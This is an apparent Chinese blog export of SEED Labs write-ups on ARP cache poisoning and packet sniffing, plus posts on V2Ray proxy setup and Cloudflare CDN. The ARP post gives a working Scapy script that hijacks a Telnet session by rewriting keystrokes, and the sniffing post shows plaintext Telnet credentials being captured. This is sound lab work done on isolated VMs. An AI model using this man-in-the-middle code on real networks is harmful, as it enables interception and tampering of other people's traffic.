在主机A和B中，查看arp缓存表。可以看到主机A中，网关和B的IP所对应的mac都变成主机M的mac地址了。而在主机B中，arp中的网关IP对应的也是主机M的mac地址。 同时做上述操作前，我还在主机A上重新利用wireshark抓包，结果如下。可以发现第一个包是一个无故ARP包，由主机M发出。同时由于冒充的是网关，所以网关真实存在，则得到了一个回应，即第二个包。所以在主机M中，网关的mac依旧是没有发生变化的。 3. Task 2:MITM Attack on Telnet using ARP Cache Poisoning3.任务2：使用ARP缓存中毒在telnet上实现中间人攻击 Hosts A and B are communicating using Telnet, and Host M wants to intercept their communication, so it can make changes to the data sent between A and B. The setup is depicted（描述，描绘） in Figure 1. 主机A和B正在使用telnet通信，而主机M想要拦截它们的通信，因此它可以对发送给A和B的数据做出修改。设置如图1所示。 Step 1 (Launch the ARP cache poisoning attack). First, Host M conducts（举办） an ARP cache poisoning attack on both A and B, such that in A’s ARP cache, B’s IP address maps to M’s MAC address, and in B’s ARP cache, A’s IP address also maps to M’s MAC address. After this step, packets sent between A and B will all be sent to M. We will use the ARP cache poisoning attack from Task 1 to achieve this goal. 步骤1（发起ARP缓存中毒攻击）。首先，主机M在A和B上都进行ARP缓存中毒攻击，以便在A的ARP缓存上有B的IP地址映射到M的MAC地址，同时在B的ARP缓存上也有A的IP地址映射到M的MAC地址。这步之后，在AB之间发送的数据包将会全部交给M。我们将使用从任务1实现的ARP缓存中毒攻击来完成这一目标。 Step 2 (Testing). After the attack is successful, please try to ping each other between Hosts A and B, and report your observation. Please show Wireshark results in your report. 步骤2（测试）。当攻击成功后，请尝试在AB之间互ping，并且记录你的发现。请在你的报告中展示Wireshark的结果。 先在M上发起对A和B的缓存欺骗攻击，使得A和B上的mac地址表关于对方的条目mac地址指向M 然后开始在A，B上互ping，可以看到ping不通。因为是在介质共享型网络中，所以可以在A,B,M三台设备上都抓到icmp包 Step 3 (Turn on IP forwarding). Now we turn on the IP forwarding on Host M, so it will forward the packets between A and B. Please run the following command and repeat Step 2. Please describe your observation. 步骤3（打开IP转发）。现在我们在主机M上打开了IP转发，所以它将转发在A和B间的数据包。请执行以下命令，并且重复步骤2.请描述你的发现。 1$ sudo sysctl net.ipv4.ip_forward=1 接上面步骤继续，然后我们在M上开启IP转发 接下来再在AB上互ping 猜想结果：当A ping B时，数据包会发给M，而由于M开启了路由转发，所以M应该会把数据包转发给B，但是由于M没有B的mac地址，所以M会发送arp广播请求。B收到回应后，就会单播回应给M。而在介质共享型网络中（该实验环境下，而非使用交换机互联），A也能收到B的单播回应，那应该A就会更新MAC地址表。则后续A 再pingB应该会使用正确的MAC地址了，而不会交给M。 那么ping 3个包试试水 看了数据包，和我想的不一样。那我们来分析下数据包 在ping第一个包的时候。有4个arp报文，以及4个seq=1的icmp报文，和2个icmp重定向报文 1号包发送了一个数据包给B，但实际上它的目的mac地址是M 2—6号包是arp报文，和一个icmp重定向报文。是M要获取到A和B的mac地址。同时M发现A是找B的，发现报文跑到我M上了，就发了路由重定向报文，告诉A，大哥你以后找B吧，交给我M是啥事啊（M是机器，它不知道我在它上面做实验了） 7号包是M替A把数据包转发给B。通过mac地址可以获知 8号包是B把回应包交给M。通过mac地址可以获知 9号包是重定向报文，由M告诉B，你以后转发数据包的时候请直接交给A，不要给我M了 10号包是M把B发过来的回应包转交给A。通过mac地址可以获知 所以综上，你才可以看到有arp包，icmp的ping包和重定向包。同时这也是为什么icmp的ping包有4个及显示上第一个ping包显示的是没有收到回应（no response）的理由 Step 4 (Launch the MITM attack). We are ready to make changes to the Telnet data between A and B. Assume（假设） that A is the Telnet client and B is the Telnet server. After A has connected to the Telnet server on B, for every key stroke（笔、划） typed（除了类型还有打印的意思） in A’s Telnet window, a TCP packet is generated（发生） and sent to B. We would like to intercept the TCP packet, and replace each typed character with a fixed character (say Z). This way, it does not matter what the user types on A, Telnet will always display Z. 步骤4（发起中间人攻击）。我们打算修改在A和B间的telnet数据。假设A是telnet客户端，B是telnet服务器。在A连接到B上的Telnet服务器之后，对于在A的Telnet窗口中键入的每个按键，都会生成一个TCP数据包并将其发送到B。我们想截取该TCP数据包，并用固定字符（如Z）替换每个键入的字符。这样，无论用户在A上键入什么，Telnet都将始终显示Z。 From the previous steps, we are able to redirect the TCP packets to Host M, but instead of forwarding them, we would like to replace them with a spoofed packet. （学习这句话的语序）We will write a sniff-and-spoof program to accomplish this goal. In particular, we would like to do the following: 从之前的步骤，我们重定向了TCP的数据包到主机M，我们想用一个欺骗性数据包替换它们，而不是转发它们。我们将写一个嗅探-欺骗程序来完成这个目标。特别的，我们将做如下操作： We first keep the IP forwarding on, so we can successfully create a Telnet connection between A to B. Once the connection is established, we turn off the IP forwarding using the following command. Please type something on A’s Telnet window, and report your observation: 我们首先开启IP转发功能，所以我们能成功在A和B之间创建telnet连接。一旦该连接建立，我们使用以下命令关闭IP转发功能。请在A的telnet窗口输入一些内容，并报告你的发现： 1$ sudo sysctl net.ipv4.ip_forward=0 在M上对A和B开启了arp欺骗 同时开启了IP转发功能 A telnet B的时候，syn的数据包也是由M帮忙转发的 A远程到B后，再在A上输入ifconfig等命令，都能在A上显示出来 此时关闭M上的IP转发功能。再在A上输入命令，或是任意字符。会发现，A上已经无法显示任何东西了。【不管输入什么，A的界面上确实没有任何反应】 但是过了不久，输入的字符又能在A上显示出来。抓包看可以知道，当A无法显示内容的时候，其实就开始发送ARP报文重新想要获取B的地址了。当获取到了B的真实MAC地址，后续输入字符和命令都能显示出来 We run our sniff-and-spoof program on Host M, such that for the captured packets sent from A to B, we spoof a packet but with TCP different data. For packets from B to A (Telnet response), we do not make any change, so the spoofed packet is exactly the same as the original one. 我们在主机M上运行嗅探-欺骗程序，对于捕获的从A发往B的数据包，我们冒充一个使用TCP不同数据内容的数据包。对于从B发往A的数据包（telnet回应），我们不做任何改变，因此冒充的数据包和原始的完全一样。 A skeleton（骨骼，框架） sniff-and-spoof program is shown below: 一个嗅探-欺骗程序的框架展示如下： 12345678910111213141516171819#!/usr/bin/pythonfrom scapy.all import *def spoof_pkt(pkt): print("Original Packet. ") print("Source IP : ", pkt[IP].src) print("Destination IP :", pkt[IP].dst) a = IP() b = TCP() data = pkt[TCP].payload newpkt = a/b/data print("Spoofed Packet. ") print("Source IP : ", newpkt[IP].src) print("Destination IP :", newpkt[IP].dst) send(newpkt)pkt = sniff(filter='tcp',prn=spoof_pkt) The above program sniffs all the TCP packets and then spoof a new TCP packet based on the captured packets. Please make necessary changes to distinguish（区分，辨别） whether a packet is sent from A or B. If it is sent from A, set all the attribute names/values of the new packet to be the same as those of the original packet, and replace each alphanumeric（一个字母或数字的字符） characters in the payload (usually just one character in each packet) with character Z. If the captured packet is sent from B, no change will be made. 以上程序监听了所有TCP数据包并且还基于捕获的数据包冒充了一个新的TCP包。请做必要的改变来区分是从A还是B发送了数据包。如果从A发送数据包，则设置新的数据包的所有属性名/值和原始数据包一致，并在负载（一般在每个数据包中都只有一个字符，注：telnet是每发送一个字符就封装一个包发出）中用Z替换每个字符。如果捕获的数据包是从B发送出去的，则不做任何改变。 In Telnet, every character we type in the Telnet window will trigger a TCP packet. Therefore, in a typical （典型）Telnet packet from client to server, the payload only contains one character. The character will then be echoed back by the server, and the client will then display the character in its window. Therefore, what we see in the client window is not the direct result of the typing; whatever we type in the client window takes a round trip before it is displayed. If the network is disconnected, whatever we typed on the client window will not displayed, until the network is recovered. Similarly（同样的）, if attackers change the character to Z during the round trip, Z will be displayed at the Telnet client window. 在telnet中，我们在telnet窗口输入的每个字符将会触发一个TCP包。因此，在一个从客户端发往服务器的典型数据包中，负载仅包含一个字符。因此，我们在客户端窗口看到的东西不是输入后的直接结果；不论我们在客户端窗口中输入什么，都需要经过返程才能显示。如果网络被关闭，不论我们在客户端窗口输入什么都将不会被显示，直到网络恢复。同样，如果攻击者在往返过程中将字符更改为Z，则Z将显示在Telnet客户端窗口中。 欺骗程序代码如下 1234567891011121314151617181920212223242526272829&gt; #!/usr/bin/python&gt; from scapy.all import *&gt; &gt; def spoof_pkt(pkt):&gt; if pkt[Ether].src =='08:00:27:04:d9:58' and pkt[IP].src == "10.0.2.15" and pkt[IP].dst == '10.0.2.5' :&gt; print("Original Packet. ")&gt; print("Source IP : ", pkt[IP].src)&gt; print("Destination IP :", pkt[IP].dst)&gt; &gt; a = IP(src = "10.0.2.15",dst = "10.0.2.5")&gt; b = TCP(sport = pkt[IP].sport,dport = pkt[IP].dport)&gt; pkt[TCP].payload = 'z'&gt; data = 'z'&gt; newpkt = a/b/data&gt; &gt; print("Spoofed Packet. ")&gt; print("Source IP : ", newpkt[IP].src)&gt; print("Destination IP :", newpkt[IP].dst)&gt; send(newpkt)&gt; &gt; elif pkt[Ether].src =='08:00:27:26:fb:90' and pkt[IP].src == "10.0.2.5" and pkt[IP].dst == '10.0.2.15' :&gt; a = IP(src = "10.0.2.5",dst = "10.0.2.15")&gt; b = TCP(sport = pkt[IP].sport,dport = pkt[IP].dport)&gt; data = pkt[TCP].payload&gt; newpkt = a/b/data&gt; send(newpkt)&gt; &gt; pkt = sniff(filter = 'tcp',prn=spoof_pkt) &gt; telnet连接建立后，关闭IP转发功能 A发给B的数据包，经M修改后再次发送给B B给的回应，经过M修改后，转发给A A的界面上依旧无法显示任何内容。但是过了一段时间，由于A获取不到信息，导致重新发送ARP报文，当获取到B的正确mac地址后，就能正常显示了 Here is a summary what we need to do in order to launch the MITM attack. 为了发起中间人攻击，以下汇总了我们需要做的事情。 Conduct ARP cache poisoning attacks against（针对） Hosts A and B. 对主机A和B进行ARP缓存中毒攻击 Turn on IP forwarding on Host M. 在主机M上开启IP转发功能 Telnet from host A to Host B. 从主机A向B发起telnet After the Telnet connection has been established, turn off IP forwarding. 在telnet连接被建立后，关闭IP转发功能 Conduct the sniff and spoof attack on Host M. 在主机M上发起嗅探和欺骗攻击 4. Submission4.提交投稿 Students need to submit a detailed lab report to describe what they have done, what they have observed, and how they interpret（阐释） the results. Reports should include evidences to support the observations. Evidences include packet traces, screenshots, etc. Reports should also list the important code snippets（一小块或简短的摘录。） with explanations. Simply attaching（附带） code without any explanation will not receive credits（信用，学分）. 学生需要上传一份细节实验报告来描述他们做了哪些操作，他们发现了什么，以及他们是怎么解释结果。报告中应该包含证据来支撑他们的发现。证据包含数据包追踪，截屏等等。报告中还应该列出带有解释的重要部分代码。没有任何解释的简单附加代码将不会获得学分。]]></content>
      <categories>
        <category>SEED Labs</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用CDN加速博客打开速度（Cloudflare）]]></title>
    <url>%2F2019%2F09%2F27%2F%E4%BD%BF%E7%94%A8CDN%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E6%89%93%E5%BC%80%E9%80%9F%E5%BA%A6%EF%BC%88Cloudflare%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1.概述由于github的服务器在国外，所以有时候访问会比较卡慢，甚至在特殊时期，网站可能会打不开。通过CDN技术可以缓解这一问题。 CDN技术简单可以理解成：在世界各地分布部署有各个缓存服务器，它们会提前缓存网站上的资源内容。当用户想要访问网站资源时，通过DNS解析，指向离用户最近的一台缓存服务器。然后直接从缓存服务器上取就可以了。这样不仅可以增加访问速度减少访问延迟，还可以减缓网站服务器上的压力。 我们需要准备的内容： 一个域名 注册使用Cloudflare Cloudflare关联github 2.域名注册我是在ResellerClub上注册的域名，主要是图便宜，界面支持中文，同时还可以支付宝付款。我买的这个域名才6块钱。以下是网络上的一些描述 ResellerClub成立于1998年，创建于印度 一，亚洲最大的域名主机提供商。售后服务等有保证。 二， 域名过户免费，可以在线修改，无需提交任何书面材料，这点是很赞的。国内域名商进行域名过户麻烦不堪，提交申请、变更注册人、等待审核，更多时候不给你进行过户，让你进得来出不去。 三， ResellerClub免费赠送高达15个邮箱的中文企业邮局。企业邮局对于很多个人或者中小企业来说十分重要，它们提供的中文企业邮局基本满足个人及中小企业的需求，在一定程度上大大地节约了成本。 四， 最赞的是whois隐私保护免费，可显示中性whois信息，对于whois信息这个很多人都知道在很多域名商那里都是收费的。 五， ResellerClub还有多样化的返款政策，相信不少使用者都受益匪浅，小编致电ResellerClub中国支持中心了解到ResellerClub的代理政策。现在代理ResellerClub旗下产品只要99元，并且代理费还是可消费的!看了ResellerClub中文官网的相关内容后，发现ResellerClub除了上面的域名注册、域名续费返款外，ResellerClub的域名转入如果量大的话也可以获得较大的返款政策。 注册一个账号（过程略） 在界面中选择注册域名，然后挑一个最便宜的域名购买就可以了，比如下面这么多域名里面框框的是最便宜的 购买完后，可以看到自己的域名管理界面 3.配置CDN参考该文档为博客添加免费的 CDN (Cloudflare) 该篇文档中的这一步，我们需要到购买域名的管理网站上做修改。把域名服务商的域名替换成Cloudflare给的。 同时该文档中的添加别名记录设置如下 设置SSL证书如下 4.和Github个人网页做关联在github个人库中进行如下图设置 5.本地博客设置在本地创建一个CNAME文件，注意大写同时不包含后缀 文件创建位置：~/blog/source/CNAME 文件里的内容写你自己的域名，然后保存，比如我的是 1dilidonglong.site 然后修改站点配置文件~/blog/_config.yml： 1234# URL## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'- url: https://dilidonglong.github.io/+ url: https://dilidonglong.site/ 以上内容就全部完成了，后续就可以使用 https://dilidonglong.site 访问个人网站了]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[科学上网]]></title>
    <url>%2F2019%2F09%2F25%2F%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%2F</url>
    <content type="text"><![CDATA[1.概述该篇文档为自己所做笔记，防止后续忘记如何部署。 2.V2Ray 简单部署2.1 V2Ray服务器部署 安装依赖及执行以下代码 1234567yum makecacheyum install curlcurl -O https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.shcurl -O https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-dat-release.shbash install-release.shbash install-dat-release.sh 在/usr/local/etc/v2ray下面创建一个新的config.json配置文件 123456789101112131415161718192021222324252627282930313233343536373839&#123; "inbounds": [&#123; "port": xxxx, //此处为安装时生成的端口，可修改随意，但是保证和下面提到的端口号相同 "listen":"127.0.0.1", //设置了监听地址后，后续在客户端上直接使用服务器IP是无法连接成功的 "protocol": "vmess", "settings": &#123; "clients": [ &#123; "id": "xxxxx-xxxx-xxxxx-xxxx-xxxxxx", //此处为安装时生成的id "level": 1, "alterId": 64 //此处为安装时生成的alterId &#125; ] &#125;, "streamSettings": &#123; "network": "ws", "wsSettings": &#123; "path": "/yuuka" //此处为路径，需要和下面NGINX上面的路径配置一样 &#125; &#125; &#125;], "outbounds": [&#123; "protocol": "freedom", "settings": &#123;&#125; &#125;,&#123; "protocol": "blackhole", "settings": &#123;&#125;, "tag": "blocked" &#125;], "routing": &#123; "rules": [ &#123; "type": "field", "ip": ["geoip:private"], "outboundTag": "blocked" &#125; ] &#125;&#125; 启动V2Ray 123systemctl restart v2raysystemctl status -l v2raysystemctl enable v2ray 开启防火墙 这个步骤一定不要漏，否则后面配置再久也没用。 CentOS 7.0 默认使用的是 firewall 作为防火墙，而不是iptables。 如果你的系统上没有安装，则使用命令安装： 安装firewalld 防火墙 1yum install firewalld 其他常用命令： 开启服务 systemctl start firewalld.service 关闭防火墙 systemctl stop firewalld.service 开机自动启动 systemctl enable firewalld.service 关闭开机制动启动 systemctl disable firewalld.service 开启防火墙上的端口。 – zone #作用域 – add-port=80/tcp #添加端口，格式为：端口/通讯协议 – permanent #永久生效，没有此参数重启后失效 123[root@ss-1 ~]# firewall-cmd --zone=public --add-port=11234/tcp --permanent[root@ss-1 ~]# firewall-cmd --zone=public --remove-port=11234/tcp --permanent[root@ss-1 ~]#firewall-cmd --list-all //查看防火墙规则 CentOS 6.0使用iptables规则，放通相应端口 12345vi /etc/sysconfig/iptables-A INPUT -m state --state NEW -m tcp -p tcp --dport 11234 -j ACCEPTsystemctl restart iptables.service #重启防火墙使配置生效 2.2 V2Ray客户端使用神一样的工具们 我在windows中，下载的上面的图形工具是V2RayW。其实解压了该压缩包，运行V2RayW.exe文件也会给出提示要下载V2Ray。 所以下载了V2RayW这个还不够，得需要下载V2Ray。 下载的V2RayW 的压缩包解压后，能看到V2RayW.exe文件。 V2RayW.exe文件需要和v2ray-core文件夹在同一个目录下。v2ray-core文件夹存放V2Ray的文件。如果没有文件夹，则自动手动建立一个。 v2ray-core文件夹内应该包含4个文件v2ray.exe、v2ctl.exe、geosite.dat、geoip.dat 运行该文件V2RayW.exe，在工具栏找到该图标，右键配置。 照下图配置 配置完后，选择加载V2Ray 此时windows主机应该可以正常上网了 附录：给Centos7服务器开BBR加速BBR介绍Google BBR (Bottleneck Bandwidth and RTT) 是一种新的TCP拥塞控制算法,它可以高效增加吞吐和降低网络延迟，并且Linux Kernel4.9+已经集成该算法。开启BBR也非常简单，因为它只需要在发送端开启，网络其他节点和接收端不需要任何改变。 升级内核1. 打开Terminal输入 1# uname -r 查看内核版本，如果输出类似 3.10.0-514.21.2.el7.x86_64 则表示小于4.9，需要升级内核，而如果内核大于等于4.9则跳过至开启Google BBR 2. 升级内核 安装 ELRepo 仓库 12rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.orgrpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm 安装最新版kernel 1# yum --enablerepo=elrepo-kernel install kernel-ml -y 确认是否安装成功 1# rpm -qa | grep kernel 如果输出类似如下，包含kernel-ml-4.13.10-1.el7.elrepo.x86_64，则表示安装成功 kernel-3.10.0-693.el7.x86_64kernel-tools-3.10.0-693.el7.x86_64kernel-ml-4.13.10-1.el7.elrepo.x86_64kernel-tools-libs-3.10.0-693.el7.x86_64 设置开机默认启动项 1# egrep ^menuentry /etc/grub2.cfg | cut -f 2 -d \' 输出结果类似如下 CentOS Linux 7 Rescue f212d2d7754a4a6bb2b98950c20cc0b5 (4.13.10-1.el7.elrepo.x86_64)CentOS Linux (4.13.10-1.el7.elrepo.x86_64) 7 (Core)CentOS Linux (3.10.0-693.el7.x86_64) 7 (Core)CentOS Linux (0-rescue-d1f142097d497f24c021d7de9b81cab4) 7 (Core) 该列表从0开始索引，所以4.13内核索引为1 设置启动项 1# grub2-set-default 1 重启 1# reboot 查看内核版本 1# uname -r 如果输出类似 4.13.10-1.el7.elrepo.x86_64 则表示升级完成 开启Google BBR 修改sysctl配置 123echo 'net.core.default_qdisc=fq' | tee -a /etc/sysctl.confecho 'net.ipv4.tcp_congestion_control=bbr' | tee -a /etc/sysctl.confsysctl -p 检查是否加载BBR 1# lsmod | grep bbr 如果输出结果包含tcp_bbr，则表示开启成功 tcp_bbr 20480 0]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[数据包的嗅探与欺骗实验]]></title>
    <url>%2F2019%2F09%2F17%2F%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E5%97%85%E6%8E%A2%E4%B8%8E%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[参考文档： 官方原文档 Scapy中文文档 我们可以拿Scapy做什么 网络工程师的Python之路—Scapy基础篇 网络工程师的Python之路—Scapy应用篇 1.Overview1.概要 Packet sniffing and spoofing are two important concepts in network security; they are two major threats（威胁） in network communication. Being able to understand these two threats is essential（必要） for understanding security measures in networking. There are many packet sniffing and spoofing tools, such as Wireshark, Tcpdump, Netwox, Scapy, etc. Some of these tools are widely used by security experts, as well as by attackers. Being able to use these tools is important for students, but what is more important for students in a network security course is to understand how these tools work, i.e., how packet sniffing and spoofing are implemented in software. 数据包嗅探和欺骗是在网络安全中两个比较重要的概念。它们是在网络通信中两个主要的威胁。能够理解这两种威胁对于理解网络中的安全措施至关重要。有许多数据包监听和嗅探工具，例如Wireshark, Tcpdump, Netwox, Scapy等等。其中的一些工具被安全专家广泛使用，当然也有攻击者。对于学生而言，尽力去使用这些工具很重要，但是对于网络安全课程的学生而言，更重要的是理解这些工具是如何工作的。例如，在软件中数据包的嗅探和欺骗是如何实现的。 The objective of this lab is two-fold: learning to use the tools and understanding the technologies underlying these tools. For the second object, students will write simple sniffer and spoofing programs, and gain an in-depth understanding of the technical aspects（方面） of these programs. This lab covers the following topics: 在这次实验室中目标有两个：学习使用这些工具并且理解这些工具下的技术。对于第二个目标，学生将写一个简单的嗅探和欺骗程序，并且获得对于这些程序在技术方面更为深入的理解。这个实验室覆盖以下主题： Scapy Sniffing using the pcap library Raw socket（原始套接字） Readings and related topics. Detailed coverage of TCP attacks can be found in Chapter 12 of the SEED book, Computer Security: A Hands-on Approach, by Wenliang Du. 阅读材料和相关主题。TCP攻击的相关细节可以在SEED书籍《计算机安全：实践方法，作者杜文亮》的第12章找到。 Lab environment. This lab has been tested on our pre-built Ubuntu 16.04 VM, which can be downloaded from the SEED website. 实验环境。这个实验室已经在我们预先建立好的Ubuntu 16.04 VM中被测试过了，可以在SEED网站下载。 Note for Instructors（讲师）. There are two sets of tasks in this lab. The first set focuses on using tools to conduct（进行，举办） packet sniffing and spoofing. It only requires a little bit of Python programming (usually a few lines of code); students do not need to have a prior（预先） Python programming background. The set of tasks can be used by students with a much broader background. 讲师注意事项。在这个实验中有两个任务。第一个关注于使用工具来进行数据包的嗅探和欺骗。它只需要一点点Python编程（通常就是几行代码）；学生不需要有预先的Python程序背景。这组任务可供具有更广泛背景的学生使用。 The second set of tasks is designed primarily for Computer Science/Engineering students. Students need to write their own C programs from the scratch（从头开始） to do sniffing and spoofing. This way, they can gain a deeper understanding on how sniffing and spoofing tools actually work. Students need to have a solid（固体，扎实） programming background for these tasks. The two sets of tasks are independent; instructors can choose to assign one set or both sets to their students, depending on their students’ programming background. 第二组任务主要是为计算机科学/工程专业的学生设计的。学生需要从头开始写下他们自己的C程序以实现嗅探和欺骗。在这一步，他们可以获得对于嗅探和欺骗工具是如何进行工作更为深入的理解。在这组任务中学生需要有扎实的编程背景。这两组实验是独立的；讲师可以选择分配一组或是两组给学生，这取决于学生的编程背景。 （碎碎念，我太难了。。。。。我选第一组） 该实验拓扑图如下： 2.Lab Task Set 1: Using Tools to Sniff and Spoof Packets2.实验任务组1：使用工具嗅探和欺骗数据包 （注：spoof有欺骗和冒充的意思，有的地方翻译成冒充感觉更合适） Many tools can be used to do sniffing and spoofing, but most of them only provide fixed functionalities. Scapy is different: it can be used not only as a tool, but also as a building block（一块积木） to construct other sniffing and spoofing tools, i.e., we can integrate（合并） the Scapy functionalities into our own program. In this set of tasks, we will use Scapy for each task. 许多工具能够被用来嗅探和欺骗，但是其中大部分只能提供固定功能。Scapy则不同：它不仅可以被用作一个工具，还可以作为一个构建其他嗅探和欺骗工具的基石。例如，我们能把Scapy的功能加到我们的程序中。在这组任务中，我们将使用Scapy完成每一个任务。 To use Scapy, we can write a Python program, and then execute this program using Python. See the following example. We should run Python using the root privilege because the privilege is required for spoofing packets. At the beginning of the program (Line º), we should import all Scapy’s modules. 为了使用Scapy，我们将写一个Python程序，然后使用Python执行这个程序。参考以下例子。我们应该使用root用户权限运行Python，因为对于嗅探数据包需要该权限。在程序开始处1，我们将导入所有的Scapy模块。 123456789101112$ view mycode.py #!/bin/bin/pythonfrom scapy.all import * //1a = IP()a.show()$ sudo python mycode.py ###[ IP ]###version = 4ihl = None... We can also get into the interactive mode of Python and then run our program one line at a time at the Python prompt. This is more convenient if we need to change our code frequently in an experiment. 我们还可以进入python的交互模式，然后在python提示符上，一次只运行一行程序。如果我们需要在实验中频繁地更改代码，这就更方便了。 12345678$ sudo python&gt;&gt;&gt; from scapy.all import *&gt;&gt;&gt; a = IP()&gt;&gt;&gt; a.show() ###[ IP ]###version = 4ihl = None... 2.1 Task 1.1: Sniffing Packets任务1.1嗅探数据包 Wireshark is the most popular sniffing tool, and it is easy to use. We will use it throughout the entire lab. However, it is difficult to use Wireshark as a building block to construct other tools. We will use Scapy for that purpose. The objective of this task is to learn how to use Scapy to do packet sniffing in Python programs. A sample code is provided in the following: Wireshark是最受欢迎的嗅探工具，并且它易于使用。我们将使用它贯穿整个实验。然而，我们却很难使用Wireshark去作为一个基础工具来构建其他工具。我们将使用Scapy来达到这一目的。这个任务的目标是学习如何在Python程序中使用Scapy来实现数据包嗅探。以下提供了一个简单的代码： 1234567#!/usr/bin/pythonfrom scapy.all import *def print_pkt(pkt): pkt.show()pkt = sniff(filter=’icmp’,prn=print_pkt) Task 1.1A.The above program sniffs packets. For each captured packet, the callback function print pkt() will be invoked（被引用）; this function will print out some of the information about the packet. Run the program with the root privilege and demonstrate（证明） that you can indeed（语气词，强调） capture packets. After that, run the program again, but without using the root privilege; describe and explain your observations. 以上程序嗅探数据包。对于每个被捕获的包，将调用回调函数打印（callback function print）PKT()；此函数将打印出关于数据包的一些信息。使用root权限运行程序，并证明你确实可以捕获数据包。在此之后，再次运行程序，但不使用root权限；描述和解释你的观察结果。 1.我在拓扑图中的第一台虚拟机下的当前用户目录下，创建了一个zhangshuaiyang的目录 2.然后把上述程序内容，复制到了zhangshuaiyang目录下的task1.1.py文本中 3.修改文件权限为764 4.使用seed用户运行该程序，可以看到如下报错PermissionError: [Errno 1] Operation not permitted。该报错的解决方案是：This means that you need to start your script with sudo/admin rights.也即执行第5步。 5.此时使用root权限再执行该脚本，能正常执行。同时我在第二台虚拟机上ping第一台虚拟机的ip，发现有数据包经过。抓包内容如表中所示，其实很容易看出来，抓的包有2个，分别是icmp的请求包和回应包。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&gt; [09/23/19]seed@VM:~/zhangshuaiyang$ sudo ./task1.1.py&gt; ###[ Ethernet ]### &gt; dst = 08:00:27:04:d9:58&gt; src = 08:00:27:0f:63:a6&gt; type = 0x800&gt; ###[ IP ]### &gt; version = 4&gt; ihl = 5&gt; tos = 0x0&gt; len = 84&gt; id = 63331&gt; flags = DF&gt; frag = 0&gt; ttl = 64&gt; proto = icmp&gt; chksum = 0x2b33&gt; src = 10.0.2.4&gt; dst = 10.0.2.15&gt; \options \&gt; ###[ ICMP ]### &gt; type = echo-request&gt; code = 0&gt; chksum = 0x5609&gt; id = 0xb71&gt; seq = 0x1&gt; ###[ Raw ]### &gt; load = '\x8c\xe2\x88]\x8dA\t\x00\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&amp;\'()*+,-./01234567'&gt; &gt; ###[ Ethernet ]### &gt; dst = 08:00:27:0f:63:a6&gt; src = 08:00:27:04:d9:58&gt; type = 0x800&gt; ###[ IP ]### &gt; version = 4&gt; ihl = 5&gt; tos = 0x0&gt; len = 84&gt; id = 42397&gt; flags = &gt; frag = 0&gt; ttl = 64&gt; proto = icmp&gt; chksum = 0xbcf9&gt; src = 10.0.2.15&gt; dst = 10.0.2.4&gt; \options \&gt; ###[ ICMP ]### &gt; type = echo-reply&gt; code = 0&gt; chksum = 0x5e09&gt; id = 0xb71&gt; seq = 0x1&gt; ###[ Raw ]### &gt; load = '\x8c\xe2\x88]\x8dA\t\x00\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&amp;\'()*+,-./01234567'&gt; Task 1.1B.Usually, when we sniff packets, we are only interested certain types of packets. We can do that by setting filters in sniffing. Scapy’s filter use the BPF (Berkeley Packet Filter) syntax; you can find the BPF manual from the Internet. Please set the following filters and demonstrate your sniffer program again (each filter should be set separately（单独地）): 通常，当我们嗅探数据包时，我们只对某些类型的数据包感兴趣。我们可以通过设置过滤器进行嗅探。Scapy的过滤器使用bpf（伯克利包过滤器）语法；你可以从互联网上找到bpf手册。请设置以下过滤器并再次证明你的嗅探器程序（每个过滤器应分别设置）： Capture only the ICMP packet 仅捕获ICMP数据包 1.我先复制一份task1.1.py，然后再把这份复制的文件改名为task1.1B1.py。 2.然后再对task1.1B1.py中的sniff（）函数做满足题目要求的修改 3.发现任务1.1A中的监听其实就是这里说的仅捕获ICMP数据包嘛，emmmmm那就不用改了 4.同时也测试了下，在VM2上telnetVM1。这个脚本是监听不到telnet数据包的 Capture any TCP packet that comes from a particular IP and with a destination port number 23. 捕获特定IP的任意TCP数据包，并且要求目的端口是23 1.我先复制一份task1.1.py，然后再把这份复制的文件改名为task1.1B2.py。 2.然后再对task1.1B2.py中的sniff（）函数做满足题目要求的修改，参考文档 3.我把代码中的过滤条件改成了filter = &#39;tcp dst port 23&#39; 4.然后再次执行测试 5.可以看到在VM1中的控制台显示出了数据包，同时我再VM2的控制台上也成功登陆到了VM1设备。使用telnet可以明文看到数据，你能从wireshark中看到我输入了账号seed，密码dees和查看ip的命令ifconfig。由于我抓取的内容是只抓目的地址是tcp23号端口的，所以源端口是23号的数据包没有抓取到。这也是为什么在wireshark中，看不到三次握手的完整流程。 Capture packets comes from or to go to a particular subnet. You can pick any subnet, such as 128.230.0.0/16; you should not pick the subnet that your VM is attached to. 捕获来自或发往特定子网的数据包。你能选择任意子网，例如123.230.0.0/16；你不应该选择你的VM所连接的子网 由于只是修改过滤条件，此处就不再做重复实验了 过滤条件可以修改为filter = &#39;net 10.3.0.0/16&#39;，表示抓取网络10.3.0.0上发到/来自所有主机的数据流(16表示长度) 2.2 Task 1.2: Spoofing ICMP Packets任务1.2 冒充ICMP数据包 As a packet spoofing tool, Scapy allows us to set the fields of IP packets to arbitrary（任意的） values. The objective of this task is to spoof IP packets with an arbitrary source IP address. We will spoof ICMP echo request packets, and send them to another VM on the same network. We will use Wireshark to observe whether our request will be accepted by the receiver. If it is accepted, an echo reply packet will be sent to the spoofed IP address. The following code shows an example of how to spoof an ICMP packets. 